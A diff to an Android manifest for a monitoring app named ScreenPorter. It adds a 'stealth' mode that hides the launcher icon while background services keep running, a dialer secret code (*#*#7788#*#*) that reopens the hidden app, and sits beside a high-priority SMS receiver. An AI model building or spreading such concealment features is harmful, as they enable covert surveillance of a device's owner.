@@ -88,16 +88,17 @@
 
         <!-- ===================================================== -->
         <!-- ECRÃ DE INSTALAÇÃO PRINCIPAL (4 passos) -->
+        <!-- A activity principal NÃO tem mais o intent-filter LAUNCHER. -->
+        <!-- O ícone do launcher é exposto por uma <activity-alias> abaixo, -->
+        <!-- que pode ser activada/desactivada em runtime pelo StealthManager -->
+        <!-- para esconder a app da gaveta. A app continua instalada e os -->
+        <!-- serviços em background continuam a correr. -->
         <!-- ===================================================== -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:launchMode="singleTask"
             android:theme="@style/Theme.ScreenPorter">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
             <!-- Deep link: screenporter://setup?server=...&user=...&token=...&jurisdiction=... -->
             <intent-filter>
                 <action android:name="android.intent.action.VIEW" />
@@ -106,6 +107,31 @@
                 <data android:scheme="screenporter" android:host="setup" />
             </intent-filter>
         </activity>
+
+        <!-- ===================================================== -->
+        <!-- ACTIVITY-ALIAS DO LAUNCHER (stealth toggle) -->
+        <!-- -->
+        <!-- Esta alias expõe o ícone na gaveta. O StealthManager chama -->
+        <!-- PackageManager.setComponentEnabledSetting() para a activar/ -->
+        <!-- desactivar em runtime. Quando desactivada, o ícone desaparece. -->
+        <!-- targetActivity aponta para a MainActivity real. -->
+        <!-- -->
+        <!-- O android:name DEVE ser "com.screenporter.companion.LauncherAlias" -->
+        <!-- (igual à constante LAUNCHER_ALIAS em StealthManager.kt). -->
+        <!-- ===================================================== -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <!-- ===================================================== -->
         <!-- CONSENT WIZARD (multi-jurisdição LGPD/GDPR/COPPA) -->
@@ -215,6 +241,24 @@
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ===================================================== -->
+        <!-- SECRET CODE RECEIVER (modo oculto) -->
+        <!-- -->
+        <!-- Intercepta o código secreto marcado no dialer (*#*#7788#*#*) -->
+        <!-- para reabrir a MainActivity quando o ícone está escondido. -->
+        <!-- Usa o broadcast nativo android.provider.Telephony.SECRET_CODE -->
+        <!-- (sem permissões de chamada, API 21+). O host do URI data -->
+        <!-- deve coincidir com o código configurado (padrão: 7788). -->
+        <!-- ===================================================== -->
+        <receiver
+            android:name=".stealth.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" />
             </intent-filter>
         </receiver>
 
